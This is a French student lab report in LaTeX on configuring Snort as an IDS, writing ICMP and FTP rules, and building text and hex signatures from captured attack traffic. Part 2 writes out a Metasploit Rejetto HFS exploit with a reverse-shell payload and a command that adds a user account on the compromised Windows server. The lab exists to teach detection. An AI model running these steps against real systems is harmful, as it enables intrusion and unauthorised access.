@@ -1,0 +1,754 @@
+\documentclass[12pt,a4paper]{article}
+
+% Packages essentiels
+\usepackage[utf8]{inputenc}
+\usepackage[french]{babel}
+\usepackage[T1]{fontenc}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{geometry}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{float}
+\usepackage{caption}
+\usepackage{subcaption}
+\usepackage{tcolorbox}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{booktabs}
+\usepackage{multirow}
+
+% Configuration de la page
+\geometry{
+    left=2.5cm,
+    right=2.5cm,
+    top=3cm,
+    bottom=3cm
+}
+
+% En-têtes et pieds de page
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{TP4: Snort IDS/IPS}
+\fancyhead[R]{Information Data Security}
+\fancyfoot[C]{\thepage}
+
+% Configuration des liens hypertextes
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=cyan,
+    citecolor=green,
+    pdfauthor={Aoudia Nour Islam, Graba Chakib Islam},
+}
+
+% Configuration des listings de code
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10},
+    keywordstyle=\color{blue}\bfseries,
+    commentstyle=\color{green!60!black},
+    stringstyle=\color{red},
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    stepnumber=1,
+    numbersep=8pt,
+    showstringspaces=false,
+    tabsize=4,
+    captionpos=b
+}
+
+% Boîtes colorées pour les notes importantes
+\newtcolorbox{notebox}[1][]{
+    colback=blue!5!white,
+    colframe=blue!75!black,
+    title=#1,
+    fonttitle=\bfseries
+}
+
+\newtcolorbox{warningbox}[1][]{
+    colback=orange!5!white,
+    colframe=orange!75!black,
+    title=#1,
+    fonttitle=\bfseries
+}
+
+\newtcolorbox{successbox}[1][]{
+    colback=green!5!white,
+    colframe=green!75!black,
+    title=#1,
+    fonttitle=\bfseries
+}
+
+% Titre du document
+\title{
+    \vspace{-2cm}
+    \Huge \textbf{TP4: Snort IDS/IPS} \\
+    \vspace{0.5cm}
+    \Large Rapport
+}
+
+\author{
+    \textbf{Graba Chakib Islam} \\[0.3cm]
+    \textbf{Aoudia Nour Islam} \\
+    \vspace{0.2cm}
+}
+
+\date{Décembre 2025}
+
+\begin{document}
+
+\maketitle
+\thispagestyle{empty}
+
+\vspace{1cm}
+
+\begin{abstract}
+Ce rapport présente la mise en œuvre et la configuration de Snort, un système de détection d'intrusion (IDS) open source. Le laboratoire couvre trois parties principales : la configuration de Snort en mode IDS avec la création de règles de détection basiques, la simulation d'une attaque réelle avec Metasploit et la capture du trafic en mode Logger, et enfin la création de règles personnalisées avancées basées sur du contenu textuel et hexadécimal. Ce travail démontre les capacités de détection d'intrusions de Snort et l'importance d'une configuration minutieuse pour une sécurité réseau efficace.
+\end{abstract}
+
+\newpage
+
+\tableofcontents
+
+\newpage
+
+\section{Objectifs du TP}
+
+Dans ce laboratoire, nous avons réalisé les objectifs suivants :
+
+\begin{itemize}[leftmargin=*]
+    \item Installation et configuration de Snort comme système de détection d'intrusion (IDS)
+    \item Création de règles Snort personnalisées pour détecter des activités suspectes
+    \item Analyse du trafic réseau capturé avec Wireshark
+    \item Simulation d'une attaque réelle et développement de règles de détection
+\end{itemize}
+
+\section{Configuration de l'Environnement}
+
+\subsection{Machines Virtuelles Utilisées}
+
+L'environnement de laboratoire est composé de trois machines virtuelles interconnectées :
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Ubuntu Desktop} - Installation de Snort (Interface: ens33)
+    \item \textbf{Windows Server 2012 R2} - Système cible avec serveur FTP
+    \item \textbf{Kali Linux} - Machine d'attaque avec Metasploit Framework
+\end{itemize}
+
+\begin{notebox}[Configuration Réseau]
+Toutes les machines virtuelles sont connectées au même réseau local pour permettre la communication et la surveillance du trafic entre elles.
+\end{notebox}
+
+\section{Partie 1: Snort en Mode IDS}
+
+\subsection{Installation de Snort}
+
+J'ai téléchargé et installé Snort sur mon système Ubuntu Desktop. L'installation a été réalisée avec succès.
+
+\textbf{Commande de vérification :}
+
+\begin{lstlisting}[language=bash, caption={Vérification de la version Snort}]
+snort -V
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{instaling-snort.png}
+    \caption{Installation de Snort}
+    \label{fig:install-snort}
+\end{figure}
+
+\begin{successbox}[Résultat]
+La version de Snort installée s'affiche correctement, confirmant le succès de l'installation.
+\end{successbox}
+
+\subsection{Visualisation de la Configuration Réseau}
+
+J'ai utilisé la commande \texttt{ifconfig} pour afficher ma configuration réseau et identifier les informations nécessaires pour la configuration de Snort :
+
+\begin{itemize}[leftmargin=*]
+    \item Interface réseau : \textbf{ens33} (Ubuntu Desktop)
+    \item Adresse IP locale
+    \item Configuration du sous-réseau
+\end{itemize}
+
+\begin{lstlisting}[language=bash, caption={Commande ifconfig}]
+ifconfig
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{2.Viewing-Network-Configuration.png}
+    \caption{Visualisation de la configuration réseau}
+    \label{fig:network-config}
+\end{figure}
+
+\begin{notebox}[Note]
+J'utilise Ubuntu Desktop avec l'interface ens33 pour faciliter l'utilisation de l'environnement graphique.
+\end{notebox}
+
+\subsection{Configuration de HOME\_NET}
+
+La configuration du réseau protégé (HOME\_NET) est une étape cruciale pour que Snort sache quel réseau surveiller.
+
+\textbf{Étapes de configuration :}
+
+\begin{enumerate}[leftmargin=*]
+    \item Ouverture du fichier de configuration Snort
+    \begin{lstlisting}[language=bash]
+sudo nano /etc/snort/snort.conf
+    \end{lstlisting}
+    
+    \item Modification de la variable \texttt{ipvar HOME\_NET} pour correspondre à mon sous-réseau
+    \item Sauvegarde de la configuration
+\end{enumerate}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{3.-Configuring-HOME_NET.png}
+    \caption{Configuration de HOME\_NET}
+    \label{fig:config-homenet}
+\end{figure}
+
+\begin{warningbox}[Important]
+La valeur HOME\_NET doit inclure le masque de sous-réseau (exemple : \texttt{192.168.x.0/24}).
+\end{warningbox}
+
+\subsection{Vérification de la Configuration}
+
+Avant de démarrer Snort en mode opérationnel, il est essentiel de tester la configuration pour s'assurer qu'il n'y a pas d'erreurs.
+
+\begin{lstlisting}[language=bash, caption={Test de configuration Snort}]
+sudo snort -T -i ens33 -c /etc/snort/snort.conf
+\end{lstlisting}
+
+\textbf{Options expliquées :}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{-T} : Mode test de configuration
+    \item \texttt{-i ens33} : Interface réseau à surveiller
+    \item \texttt{-c} : Chemin du fichier de configuration
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{3.2.-Verifying-Configuration.png}
+    \caption{Vérification de la configuration}
+    \label{fig:verify-config}
+\end{figure}
+
+\begin{successbox}[Résultat]
+Le test de configuration a réussi, confirmant que Snort est correctement configuré.
+\end{successbox}
+
+\subsection{Création de Règles Snort}
+
+\subsubsection{Comprendre la Syntaxe des Règles}
+
+Une règle Snort se compose de deux parties principales :
+
+\textbf{En-tête de règle :}
+\begin{lstlisting}
+alert icmp any any -> $HOME_NET any
+\end{lstlisting}
+
+\begin{itemize}[leftmargin=*]
+    \item \texttt{alert} : Action à effectuer (générer une alerte)
+    \item \texttt{icmp} : Protocole à surveiller
+    \item \texttt{any any} : IP source et port source (tous)
+    \item \texttt{->} : Direction du trafic
+    \item \texttt{\$HOME\_NET any} : IP destination et port destination
+\end{itemize}
+
+\textbf{Options de règle :}
+\begin{lstlisting}
+(msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
+\end{lstlisting}
+
+\begin{itemize}[leftmargin=*]
+    \item \texttt{msg} : Message descriptif de l'alerte
+    \item \texttt{sid} : Identifiant unique de la règle (>1000000 pour règles personnalisées)
+    \item \texttt{classtype} : Catégorie de classification
+\end{itemize}
+
+\subsubsection{Création de la Première Règle ICMP}
+
+La vérification initiale a montré que 0 règles Snort étaient chargées. J'ai créé ma première règle dans le fichier \texttt{local.rules} pour détecter le trafic ICMP.
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{4.-Creating-Rules.png}
+        \caption{Édition du fichier de règles}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{4.1.-Creating-Rules.png}
+        \caption{Ajout de la règle ICMP}
+    \end{subfigure}
+    \caption{Création de règles Snort}
+    \label{fig:creating-rules}
+\end{figure}
+
+\textbf{Règle ICMP créée :}
+\begin{lstlisting}
+alert icmp any any -> $HOME_NET any (msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{4.2.-Creating-Rules.png}
+    \caption{Vérification du chargement de la règle}
+    \label{fig:rule-loaded}
+\end{figure}
+
+\begin{successbox}[Résultat]
+"1 Snort rules read" confirme que notre règle est active.
+\end{successbox}
+
+\subsection{Démarrage de Snort en Mode IDS}
+
+J'ai démarré Snort en mode détection d'intrusion avec affichage des alertes dans la console.
+
+\begin{lstlisting}[language=bash, caption={Démarrage de Snort en mode IDS}]
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
+\end{lstlisting}
+
+\textbf{Options expliquées :}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{-A console} : Afficher les alertes dans la console
+    \item \texttt{-q} : Mode silencieux (sans bannière de démarrage)
+    \item \texttt{-c} : Fichier de configuration
+    \item \texttt{-i} : Interface réseau à surveiller
+\end{itemize}
+
+\begin{notebox}[Observation]
+L'écran semble figé - c'est le comportement normal, Snort attend du trafic à analyser.
+\end{notebox}
+
+\subsection{Test de Détection ICMP}
+
+J'ai effectué un ping depuis la machine Kali Linux vers mon système Ubuntu pour tester la détection ICMP.
+
+\textbf{Sur Kali Linux :}
+\begin{lstlisting}[language=bash]
+ping 192.168.x.x
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{6.-Testing-ICMP-Detection.png}
+        \caption{Génération de trafic ICMP}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{6.1.-Testing-ICMP-Detection.png}
+        \caption{Alertes détectées}
+    \end{subfigure}
+    \caption{Test de détection ICMP}
+    \label{fig:icmp-detection}
+\end{figure}
+
+\begin{successbox}[Résultat]
+Chaque paquet ICMP (echo request et echo reply) a déclenché une alerte, prouvant l'efficacité de notre règle de détection.
+\end{successbox}
+
+\subsection{Création d'une Règle de Détection FTP}
+
+Pour une détection plus ciblée, j'ai créé une deuxième règle spécifique pour surveiller les tentatives de connexion FTP depuis Kali Linux.
+
+\textbf{Règle FTP créée :}
+\begin{lstlisting}
+alert tcp 192.168.x.x any -> $HOME_NET 21 (msg:"FTP connection attempt"; sid:1000002; rev:1;)
+\end{lstlisting}
+
+\textbf{Explication de la règle :}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{tcp} : Protocole TCP uniquement
+    \item \texttt{192.168.x.x} : IP source spécifique (Kali Linux)
+    \item \texttt{21} : Port FTP standard
+    \item \texttt{rev:1} : Numéro de révision de la règle
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{7.-Creating-an-FTP-Connection-Rule.png}
+    \caption{Création de la règle FTP}
+    \label{fig:ftp-rule}
+\end{figure}
+
+\subsection{Exécution de Snort avec Logging ASCII}
+
+J'ai redémarré Snort avec l'option de logging ASCII activée pour enregistrer les détails des paquets dans un format lisible.
+
+\begin{lstlisting}[language=bash, caption={Snort avec logging ASCII}]
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens33 -K ascii
+\end{lstlisting}
+
+\begin{notebox}[Avantage]
+Les logs ASCII permettent une analyse manuelle plus facile du contenu des paquets.
+\end{notebox}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{8.-Running-Snort-with-ASCII-Logging.png}
+    \caption{Exécution avec logging ASCII}
+    \label{fig:ascii-logging}
+\end{figure}
+
+\subsection{Test de Détection de Connexion FTP}
+
+Depuis la VM Kali Linux, j'ai initié une connexion FTP vers mon système Ubuntu.
+
+\begin{lstlisting}[language=bash]
+ftp 192.168.x.x
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{9.-Testing-FTP-Connection-Detection.png}
+    \caption{Test de détection FTP}
+    \label{fig:ftp-detection}
+\end{figure}
+
+\begin{successbox}[Résultat]
+La tentative de connexion FTP a été immédiatement détectée et signalée.
+\end{successbox}
+
+\subsection{Vérification de la Génération d'Alertes}
+
+La console Snort a affiché les alertes pour les tentatives de connexion FTP comme prévu.
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{10.-Verifying-Alert-Generation.png}
+        \caption{Test depuis Kali Linux}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{10.1-Verifying-Alert-Generation.png}
+        \caption{Alertes générées}
+    \end{subfigure}
+    \caption{Vérification des alertes}
+    \label{fig:verify-alerts}
+\end{figure}
+
+\subsection{Examen des Logs Snort}
+
+J'ai utilisé la commande \texttt{ls /var/log/snort} pour visualiser le répertoire des logs Snort.
+
+\begin{lstlisting}[language=bash]
+ls /var/log/snort
+sudo ls /var/log/snort/192.168.12.148/
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{11.-Examining-Snort-Logs.png}
+    \caption{Examen des logs Snort}
+    \label{fig:snort-logs}
+\end{figure}
+
+\begin{notebox}[Organisation des logs]
+Snort organise automatiquement les alertes par adresse IP source, facilitant l'analyse des activités suspectes par machine.
+\end{notebox}
+
+\subsection{Analyse des Paquets avec Wireshark}
+
+J'ai utilisé Wireshark pour analyser les paquets capturés et obtenir une vue détaillée du trafic réseau.
+
+\begin{lstlisting}[language=bash]
+sudo wireshark
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{11.2.-Analyzing-Packets-with-Wireshark.png}
+    \caption{Analyse avec Wireshark}
+    \label{fig:wireshark}
+\end{figure}
+
+\subsection{Test avec Windows Server}
+
+J'ai vérifié l'adresse IP de ma machine Windows Server 2012 et me suis connecté à son serveur FTP avec des identifiants invalides.
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{12-14.-Testing-with-Windows-Server.png}
+        \caption{Identification de l'IP}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{Trying-to-connect-from-ubuntu.png}
+        \caption{Tentative de connexion}
+    \end{subfigure}
+    \caption{Test avec Windows Server}
+    \label{fig:windows-test}
+\end{figure}
+
+\subsection{Règle de Détection d'Échec de Connexion}
+
+J'ai créé une troisième règle pour détecter les tentatives de connexion FTP échouées.
+
+\begin{lstlisting}
+alert tcp $HOME_NET 21 -> any any (msg:"FTP failed login"; content:"Login or password incorrect"; sid:1000003; rev:1;)
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{15.-Creating-a-Failed-Login-Detection-Rule.png}
+    \caption{Règle de détection d'échec de connexion}
+    \label{fig:failed-login-rule}
+\end{figure}
+
+\begin{notebox}[Application]
+Cette règle permet de détecter des tentatives de brute-force ou des attaques par dictionnaire contre le serveur FTP.
+\end{notebox}
+
+\subsection{Test de la Règle d'Échec de Connexion}
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{16.-Testing-the-Failed-Login-Rule.png}
+        \caption{Test de la règle}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{16.1.-Testing-the-Failed-Login-Rule.png}
+        \caption{Alertes générées}
+    \end{subfigure}
+    \caption{Test de détection d'échec de connexion}
+    \label{fig:failed-login-test}
+\end{figure}
+
+\section{Partie 2: Snort en Mode Logger et Simulation d'Attaque}
+
+\subsection{Objectif}
+
+Capturer le trafic d'une attaque réelle avec Metasploit, puis analyser les paquets pour créer une règle de détection personnalisée.
+
+\subsection{Lancement de Metasploit}
+
+J'ai lancé Metasploit sur Kali Linux et configuré l'exploit Rejetto HFS.
+
+\begin{lstlisting}[language=bash, caption={Configuration de Metasploit}]
+msfconsole
+use exploit/windows/http/rejetto_hfs_exec
+set PAYLOAD windows/shell/reverse_tcp
+set LHOST 192.168.x.x  # IP de Kali Linux
+set RHOST 192.168.x.x  # IP de Windows Server
+set RPORT 8081
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2.1.png}
+    \caption{Configuration de l'exploit Metasploit}
+    \label{fig:metasploit-config}
+\end{figure}
+
+\subsection{Configuration de Snort en Mode Logging}
+
+\begin{lstlisting}[language=bash, caption={Snort en mode Logger}]
+sudo snort -dev -q -l /var/log/snort -i ens33
+\end{lstlisting}
+
+\textbf{Options expliquées :}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{-d} : Dump du contenu des paquets
+    \item \texttt{-e} : Afficher les en-têtes Ethernet
+    \item \texttt{-v} : Mode verbeux
+    \item \texttt{-l} : Répertoire de logging
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2.2.png}
+    \caption{Snort en mode logging}
+    \label{fig:snort-logging}
+\end{figure}
+
+\subsection{Exécution de l'Attaque}
+
+\begin{figure}[H]
+    \centering
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{Exo2--3.1.png}
+        \caption{Serveur HFS vulnérable}
+    \end{subfigure}
+    \hfill
+    \begin{subfigure}[b]{0.45\textwidth}
+        \includegraphics[width=\textwidth]{Exo2--3.2.png}
+        \caption{Exécution de l'exploit}
+    \end{subfigure}
+    \caption{Simulation de l'attaque}
+    \label{fig:attack-execution}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2--3.3.snort-captured.png}
+    \caption{Capture du trafic par Snort}
+    \label{fig:traffic-captured}
+\end{figure}
+
+\begin{successbox}[Résultat]
+Snort a capturé tout le trafic de l'attaque, incluant la communication initiale, l'exploitation et l'établissement du shell.
+\end{successbox}
+
+\subsection{Commandes sur le Système Compromis}
+
+\begin{lstlisting}[language=bash]
+net user votrenom P@ssword12 /ADD
+cd \
+mkdir votrenom
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2-4.png}
+    \caption{Exécution de commandes malveillantes}
+    \label{fig:malicious-commands}
+\end{figure}
+
+\subsection{Analyse dans Wireshark}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2-5png.png}
+    \caption{Recherche des paquets dans Wireshark}
+    \label{fig:wireshark-search}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2-6.png}
+    \caption{Suivi des flux TCP}
+    \label{fig:tcp-stream}
+\end{figure}
+
+\subsection{Identification de la Signature}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Exo2-7.png}
+    \caption{Identification de la chaîne signature}
+    \label{fig:signature}
+\end{figure}
+
+\textbf{Signature identifiée :}
+\begin{lstlisting}
+C:\Users\Administrator\Desktop\hfs2.3b>
+\end{lstlisting}
+
+\begin{warningbox}[Importance]
+Ce chemin spécifique est une signature unique de l'exploit Rejetto HFS. Sa présence dans le trafic réseau indique une compromission réussie.
+\end{warningbox}
+
+\section{Partie 3: Création de Règles Personnalisées}
+
+\subsection{Règle Basée sur du Contenu Texte}
+
+\begin{lstlisting}[caption={Règle de détection textuelle}]
+alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:1;)
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{exo3-1.png}
+    \caption{Création de la règle textuelle}
+    \label{fig:text-rule}
+\end{figure}
+
+\subsection{Test de la Règle Textuelle}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{exo3-2.png}
+    \caption{Test de détection avec règle textuelle}
+    \label{fig:text-rule-test}
+\end{figure}
+
+\begin{successbox}[Résultat]
+Multiples alertes "Command Shell Access" ont été générées, confirmant l'efficacité de la détection.
+\end{successbox}
+
+\subsection{Règle avec Contenu Hexadécimal}
+
+\subsubsection{Pourquoi l'Hexadécimal?}
+
+\textbf{Avantages :}
+\begin{itemize}[leftmargin=*]
+    \item Détecte le contenu binaire, encodé ou obfusqué
+    \item Plus précis que le texte simple
+    \item Résistant aux variations d'encodage
+    \item Peut cibler des patterns non imprimables
+\end{itemize}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{exo3-3.png}
+    \caption{Préparation de la règle hexadécimale}
+    \label{fig:hex-rule-prep}
+\end{figure}
+
+\subsection{Extraction du Contenu Hexadécimal}
+
+\textbf{Méthode d'extraction :}
+\begin{enumerate}[leftmargin=*]
+    \item Sélection du paquet dans Wireshark
+    \item Sélection de la ligne "Data"
+    \item Clic droit $\rightarrow$ \textit{Copy} $\rightarrow$ \textit{Bytes} $\rightarrow$ \textit{Offset Hex}
+    \item Nettoyage des valeurs hexadécimales
+    \item Encadrement avec des pipes \texttt{|valeurs\_hex|}
+\end{enumerate}
+
+\begin{lstlisting}[caption={Règle hexadécimale finale}]
+alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"|43 3a 5c 55 73 65 72 73 5c 41 64 6d 69 6e 69 73 74 72 61 74 6f 72 5c 44 65 73 6b 74 6f 70 5c 68 66 73 32 2e 33 62 3e|"; sid:1000004; rev:2;)
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{exo3-4.png}
+    \caption{Règle avec contenu hexadécimal}
+    \label{fig:hex-rule}
+\end{figure}
+
+\subsection{Test de la Règle Hexadécimale}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{exo3-5.png}
+    \caption{Test de la règle hexadécimale}
+    \label{fig:hex-rule-test}
+\end{figure}
+
+\textbf{Analyse comparative :}
+
+\begin{table}[H]
+\centering
+\caption{Comparaison des règles}
+\label{tab:rule-comparison}
+\begin{tabular}{@{}lcc@{}}
+\toprule
+\textbf{Type de Règle} & \textbf{Nombre d'Alertes} & \textbf{Précision} \\ \midrule
+Contenu texte (sans >) & 4 alertes & Moins précise \\
+Contenu hexadécimal (avec >) & 2 alertes & Plus précise \\ \bottomrule
+\end{tabular}
+\end{table}
+
+\begin{successbox}[Conclusion]
+Les règles hexadécimales offrent une détection plus granulaire et sont préférables pour les signatures complexes.
+\end{successbox}
+
+\end{document}
